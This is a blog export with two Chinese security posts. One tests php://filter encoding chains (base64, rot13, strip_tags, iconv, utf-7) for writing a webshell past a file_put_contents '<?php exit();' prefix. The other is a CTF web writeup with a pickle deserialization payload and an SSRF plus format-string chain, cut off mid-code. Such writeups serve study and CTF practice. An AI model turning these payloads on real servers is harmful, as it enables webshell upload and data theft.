<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于file_put_contents的一些小测试</title>
    <url>/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>昨天看了篇文章<a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a>，被里面的各种骚操作给秀到了，发现<code>file_put_contents</code>这个很有意思，绕过<code>&lt;?php exit();</code>GetShell也经常有人提出不同的思路，这里简单的做一下测试和记录。</p>
<h1 id="file-put-contents-filename-”-lt-php-exit-”-content"><a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="file_put_contents($filename,”&lt;?php exit();”.$content);"></a>file_put_contents($filename,”&lt;?php exit();”.$content);</h1><blockquote>
<p><strong>前提</strong>：这种是前后两个变量不同，假设$filename,$content我们都可控情况</p>
</blockquote>
<p>这种情况相对较为简单，先捋清思路，$filename控制的写入的文件名，$content拼接在了<code>&lt;?php exit();</code>后，所以想要GetShell的话，就必须把<code>&lt;?php exit();</code>给干掉，而都知道$filename是控制文件名的，如果我们使用<strong>php://filter</strong>协议的话，这会先按<strong>php://filter</strong>规定的协议对$content进行解码后再写入协议，更强大的是<strong>php://filter</strong>还支持使用多个过滤器规则，也就是说我们可以来个连环操作。所以思路很简单，目标就是把<code>&lt;?php exit();</code>解码为php不认识的字符，而我们构造的内容能够正常的解码出来就可以。这个在phith0n之前的文章里有了很详细的介绍<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">传送门</a>，这里简单的介绍一下</p>
<h2 id="0x01-Base64编码"><a href="#0x01-Base64编码" class="headerlink" title="0x01 Base64编码"></a>0x01 Base64编码</h2><p>最常用的就是base64编码了，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位如👇</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ -&gt; $content</span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=Cyc1e.php  -&gt; $filename</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151021554.png" alt></p>
<h2 id="0x02-Rot13编码"><a href="#0x02-Rot13编码" class="headerlink" title="0x02 Rot13编码"></a>0x02 Rot13编码</h2><p>同样，也可以利用rot13编码来绕过，原理和Base64编码是一样的，就不多赘述了，如下👇</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; <span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span> -&gt; $content</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151425262.png" alt></p>
<p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p>
<h2 id="0x03-组合拳"><a href="#0x03-组合拳" class="headerlink" title="0x03 组合拳"></a>0x03 组合拳</h2><p>我们可以利用<strong>php://filter</strong>字符串处理方法&amp;&amp;编码的方法绕过<code>&lt;?php exit();</code>，相对于直接编码就有点多此一举了，不过知道有这个方法就好了，例如利用strip_tags方法来直接去除xml，而我们传入的shell是base64编码过的，所以不会被去除，再解码即可，前面也说了<strong>php://filter</strong>是支持使用多个多滤器的，所以构造如下👇</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt;<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOz8+ -&gt; $content <span class="comment">#这里由于`&lt;?php exit();`不是完整的标签，所以需要补上’?&gt;‘进行补全</span></span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags|<span class="built_in">convert</span>.base64-decode/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403152859574.png" alt></p>
<h1 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h1><blockquote>
<p><strong>前提</strong>：这种是前后两个变量相同，假设$a可控情况</p>
</blockquote>
<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些，这里也简单记录下测试的内容👇</p>
<h2 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h2><p>这里和上面对应上，不过经过个人测试，直接只用Base64的方式是<strong>不行的</strong>！（如果有构造出来的，分享一下），接下来讲讲为何个人觉得不行 ~</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">a</span>,<span class="string">"&lt;?php exit();"</span>.$<span class="params">a</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用<strong>php://filter</strong>来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可，而Base64构造的话，例如</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p>构造的shell可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php<span class="regexp">//</span>filter<span class="regexp">/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/</span>resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p>而默认情况下base64编码是以 <strong>=</strong> 作为结尾的，所以正常解码的时候到了 = 就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 = 过不掉，所以导致过滤器解码失败，从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）👇</p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160120749.png" alt></p>
<p>我们也可以简单的测试一下是否是 <strong>=</strong> 出的问题，</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#3.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename=<span class="string">"php://filter/write=convert.base64-decode/resource=Cyc1e.php"</span>;</span><br><span class="line">$content=<span class="string">"PD9waHAgcGhwaW5mbygpOz8+"</span>;</span><br><span class="line">file_put_contents($filename,<span class="string">"&lt;?PHP exit();//="</span>.$content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160208500.png" alt></p>
<p>结果是一样的，所以可以确定是 <strong>=</strong> 出的问题，要是有绕过的构造方法，欢迎分享。</p>
<h2 id="0x02-Rot13"><a href="#0x02-Rot13" class="headerlink" title="0x02 Rot13"></a>0x02 Rot13</h2><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13|<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt></p>
<p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p>
<h2 id="0x03-iconv字符编码转换"><a href="#0x03-iconv字符编码转换" class="headerlink" title="0x03 iconv字符编码转换"></a>0x03 iconv字符编码转换</h2><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式，而我们构造的转成可正常解析的。👇</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">#echo iconv(<span class="string">"UCS-2LE"</span>,<span class="string">"UCS-2BE"</span>,'&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;hp phpipfn(<span class="name">o</span><span class="comment">;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>这里用的是UCS-2，当然我们也可以用UCS-4👇</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">echo iconv(<span class="string">"UCS-4LE"</span>,<span class="string">"UCS-4BE"</span>,'aa&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;aa phpiphp(<span class="name">ofn&gt;</span>?<span class="comment">;)</span></span><br></pre></td></tr></table></figure>

<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload👇</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line">**<span class="literal">or</span>**</span><br><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line"><span class="meta">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?<span class="comment">;)之前字符个数是4的倍数，所以需要补3个字符</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162535114.png" alt></p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162950176.png" alt></p>
<p>当然这种方法对于前后不同变量也是一样适用的<del>~</del></p>
<h2 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，这里就用UCS-2和rot13举一个例子吧👇</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">$<span class="attr">a</span> = 'php://filter/<span class="attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="attr">resource=Cyc1e.php';</span> <span class="comment">#同样需要补位，这里补了一个x</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403165229869.png" alt></p>
<p>为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，这里需要找其他的编码方式进行构造，这里做个小tips，由于strip_tags去除的是一个闭合的标签所以<code>?&gt;</code>可以放在我们构造的shell编码前，这样在contents上就直接把shell前的字符去了，只要shell的编码不会被删除，就可以解码回shell写入文件中，本菜懒，就不一个一个过滤器试了<del>~</del></p>
<h3 id="第二套连招"><a href="#第二套连招" class="headerlink" title="第二套连招"></a>第二套连招</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a href="http://yulige.top" target="_blank" rel="noopener">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了👇</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">$a='php://filter/<span class="built_in">convert</span>.iconv.utf-<span class="number">8.</span>utf-<span class="number">7</span>|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php'; #<span class="built_in">base64</span>编码前补了AA，原理一样，补齐位数</span><br></pre></td></tr></table></figure>

<p>我们看一下转码后的结果</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UTF-8</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php</span></span><br><span class="line">👇</span><br><span class="line"><span class="attribute">UTF-7</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-AAPD9waHAgcGhwaW5mbygpOz8+-/resource+AD0-Cyc1e.php</span></span><br></pre></td></tr></table></figure>

<p>这样就成功的把 <strong>=</strong> 给转了，base64编码没有受到影响，一样可以正常的解码~</p>
<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403193558288.png" alt></p>
<p>所以对于base64的运用，只要找到一个能把 <strong>=</strong> 转了同时又不影响base64编码后的字符的转码方式即可<del>~</del></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的记录了一下本菜的测试过程，过滤器只用了提到的和常用的，当然<strong>php://filter</strong>还有其他的过滤器是可以用的，不过总结起来说，思路都是一样的，就是如何把<code>&lt;?php exit();</code>给<strong>”吃掉“</strong>，让自己构造的shell可以正常运行，简单总结了这种方法，当然，方法万千，师傅们有好的方法也欢迎分享（白嫖）<del>~</del></p>
<p>tips：<code>file_put_contents</code>和<code>file_get_contents</code>这两个函数还是很有意思的，file_get_contents也有很多特性，下次有时间再写</p>
]]></content>
      <categories>
        <category>Cyc1e的漏洞分析之路</category>
      </categories>
      <tags>
        <tag>file_put_contents</tag>
        <tag>php://filter</tag>
      </tags>
  </entry>
  <entry>
    <title>GXZYCTF部分Web Writeup</title>
    <url>/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/</url>
    <content><![CDATA[<p><strong>很长一段时间没有接触了，都沉迷于课程学习不能自拔（被迫的），果然2020年对题目都失去了感觉，不仅如此，刚打开就想x了……，简单先整理一下做出来的题。</strong></p>
<h3 id="0x00-Webtmp"><a href="#0x00-Webtmp" class="headerlink" title="0x00 Webtmp"></a>0x00 Webtmp</h3><p>题目源码</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="constructor">Flask(<span class="params">__name__</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Animal:</span><br><span class="line">    def <span class="constructor">__init__(<span class="params">self</span>, <span class="params">name</span>, <span class="params">category</span>)</span>:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__repr__(<span class="params">self</span>)</span>:</span><br><span class="line">        return f'<span class="constructor">Animal(<span class="params">name</span>=&#123;<span class="params">self</span>.<span class="params">name</span>!<span class="params">r</span>&#125;, <span class="params">category</span>=&#123;<span class="params">self</span>.<span class="params">category</span>!<span class="params">r</span>&#125;)</span>'</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__eq__(<span class="params">self</span>, <span class="params">other</span>)</span>:</span><br><span class="line">        return <span class="keyword">type</span>(other) is Animal <span class="keyword">and</span> self.name<span class="operator"> == </span>other.name <span class="keyword">and</span> self.category<span class="operator"> == </span>other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="constructor">RestrictedUnpickler(<span class="params">pickle</span>.Unpickler)</span>:</span><br><span class="line">    def find<span class="constructor">_class(<span class="params">self</span>, <span class="params">module</span>, <span class="params">name</span>)</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">module</span><span class="operator"> == </span>'__main__':</span><br><span class="line">            return getattr(sys.modules<span class="literal">['<span class="identifier">__main__</span>']</span>, name)</span><br><span class="line">        raise pickle.<span class="constructor">UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (<span class="params">module</span>, <span class="params">name</span>)</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted<span class="constructor">_loads(<span class="params">s</span>)</span>:</span><br><span class="line">    return <span class="constructor">RestrictedUnpickler(<span class="params">io</span>.BytesIO(<span class="params">s</span>)</span>).load<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(filename, encoding='utf-<span class="number">8</span>'):</span><br><span class="line">    <span class="keyword">with</span> <span class="keyword">open</span>(filename, <span class="character">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        return fin.read<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="character">'/'</span>, methods=<span class="literal">['GET', 'POST']</span>)</span><br><span class="line">def index<span class="literal">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.args.get('source'):</span><br><span class="line">        return <span class="constructor">Response(<span class="params">read</span>(<span class="params">__file__</span>)</span>, mimetype='text/plain')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get('data')</span><br><span class="line">            <span class="keyword">if</span> b<span class="character">'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters <span class="keyword">or</span> RCEs.'</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted<span class="constructor">_loads(<span class="params">base64</span>.<span class="params">b64decode</span>(<span class="params">pickle_data</span>)</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">type</span>(result) is not Animal:</span><br><span class="line">                    return 'Are you sure that is an animal???'</span><br><span class="line">            correct = (result<span class="operator"> == </span><span class="constructor">Animal(<span class="params">secret</span>.<span class="params">name</span>, <span class="params">secret</span>.<span class="params">category</span>)</span>)</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">unpickle_result</span>.<span class="params">html</span>', <span class="params">result</span>=<span class="params">result</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>, <span class="params">giveflag</span>=<span class="params">correct</span>)</span></span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            return <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = <span class="constructor">Animal('一给我哩<span class="params">giaogiao</span>', 'Giao')</span></span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode<span class="literal">()</span></span><br><span class="line">    return render<span class="constructor">_template('<span class="params">unpickle_page</span>.<span class="params">html</span>', <span class="params">sample_obj</span>=<span class="params">sample_obj</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__<span class="operator"> == </span>'__main__':</span><br><span class="line">    app.run(host='<span class="number">0.0</span>.<span class="number">0.0</span>', port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>很明显一道python反序列化的题，不过<code>if b&#39;R&#39; in base64.b64decode(pickle_data)</code>断了直接反弹shell和调用render_template函数的操作，所以说就是只能给secret.name、secret.category变量赋值，要求type为Animal，同时secret又要重main启动，所以需要重写一下secret类。参考<a href="https://blog.init-new-world.com/post/hitctf-train.html（也就是原题）" target="_blank" rel="noopener">https://blog.init-new-world.com/post/hitctf-train.html（也就是原题）</a></p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309103404408.png" alt></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   2020-03-07 14:51:06</span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b"<span class="symbol">\x</span>80<span class="symbol">\x</span>03c__main__<span class="symbol">\n</span>secret<span class="symbol">\n</span>&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub0c__main__<span class="symbol">\n</span>Animal<span class="symbol">\n</span>)<span class="symbol">\x</span>81&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub."</span><br><span class="line">print(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>



<h3 id="0x01-fmkq"><a href="#0x01-fmkq" class="headerlink" title="0x01 fmkq"></a>0x01 fmkq</h3><p>访问直接给了题目源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>关键就是触发curl了，参考<a href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> 通过extract进行变量覆盖，覆盖begin为begin=%1$s，则<code>sprintf($begin.&#39;%d&#39;,$output);</code>处就可以输出，例如构造</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure>

<p>则可以返回baidu的内容，所以显然用来SSRF最合适不过，发现127.0.0.1还开了8080端口，所以构造</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309104345436.png" alt></p>
<p>也就是需要我们拿到vipcode，一通测试，python的格式化字符串问题，构造</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure>

<p>可以读取到vipcode</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105152178.png" alt></p>
<p>带上vipcode就可以为所欲为了</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105248654.png" alt></p>
<p>提示了flag所在的文件，结合题目提示，flag的路径就是/fl4g_1s_h3re_u_wi11_rua/flag，读取题目源码可以发现fl4g被过滤了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span 